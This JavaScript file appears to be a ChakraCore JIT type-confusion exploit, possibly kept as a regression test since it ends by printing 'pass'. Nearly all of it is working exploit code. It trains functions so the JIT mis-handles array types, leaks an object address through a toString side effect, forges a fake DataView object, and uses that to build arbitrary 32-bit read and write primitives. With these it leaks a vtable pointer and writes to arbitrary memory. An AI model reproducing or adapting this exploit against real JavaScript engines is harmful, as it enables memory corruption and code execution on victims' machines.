function go() {
    a1 = [1.1,2.2];
    a2 = [1.1,2.2];
    const v11 = new ArrayBuffer(4);
    ab = v11;
    const v15 = new Uint8ClampedArray(ab);
    tarr = v15;
    fakeaddr = 187650270804923 * 5e-324;
    function aaa(a22, a23, a24) {
        a22[0] = 1.1;
        a22[1] = 2.2;
        a23[0] = a24;
        a22[0] = fakeaddr;
        return a24;
    }
    function bbb(a29, a30, a31) {
        a29[0] = 1.1;
        a29[1] = 2.2;
        a30[0] = a31;
        return a29[0];
    }
    for (let i36 = 0; i36 < 1048576; i36++) {
        aaa(a1, tarr, 3);
    }
    for (let i47 = 0; i47 < 1048576; i47++) {
        bbb(a2, tarr, 3);
    }
    const v73 = new Array(286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153, 286331153);
    var arr = v73;
    const v76 = new ArrayBuffer(256);
    const v78 = new Float64Array(ab = v76);
    var farr = v78;
    const v81 = new Uint32Array(ab);
    var uarr = v81;
    function f85() {
        a2[0] = arr;
        return 9;
    }
    farr[0] = bbb(a2, tarr, { toString: f85 });
    var leakaddr = (uarr[1] * 4294967296) + uarr[0];
    fakeaddr = (leakaddr + 88) * 5e-324;
    function f101() {
        a1[0] = {};
        return 9;
    }
    aaa(a1, tarr, { toString: f101 });
    typeidaddr = leakaddr + 88;
    abaddr = leakaddr + 44;
    function low32(a113) {
        return a113 % 4294967296;
    }
    function high32(a117) {
        return Math.floor(a117 / 4294967296);
    }
    function toInt(a123) {
        return a123 < 2147483648 ? a123 : -(4294967296 - a123);
    }
    function toUint(a131) {
        return a131 >= 0 ? a131 : 4294967296 + a131;
    }
    arr[0] = 56;
    arr[1] = 0;
    arr[2] = toInt(low32(typeidaddr));
    arr[3] = toInt(high32(typeidaddr));
    arr[4] = 0;
    arr[5] = 0;
    arr[6] = 0;
    arr[7] = 0;
    arr[8] = 43981;
    arr[9] = 0;
    arr[10] = toInt(low32(abaddr));
    arr[11] = toInt(high32(abaddr));
    arr[12] = 0;
    arr[13] = 0;
    arr[14] = 1094795585;
    arr[15] = 1094795585;
    arr[16] = 0;
    arr[17] = 0;
    fakeobj = a1[0];
    function f163(a164) {
        arr[14] = toInt(low32(a164));
        arr[15] = toInt(high32(a164));
        return DataView.prototype.getUint32.call(fakeobj, 0, true);
    }
    var read32 = f163;
    function f177(a178, a179) {
        arr[14] = toInt(low32(a178));
        arr[15] = toInt(high32(a178));
        DataView.prototype.setUint32.call(fakeobj, 0, a179, true);
    }
    var write32 = f177;
    WScript.Echo(("vtable:" + read32(leakaddr + 4).toString(16)) + read32(leakaddr).toString(16));
    arr.length = 4294967295;
    write32(leakaddr + 68, 4294967295);
    write32(leakaddr + 72, 4294967295);
    write32(187650270804923, 0);
}
try {
    go();
} catch(e218) {
}
console.log("pass");
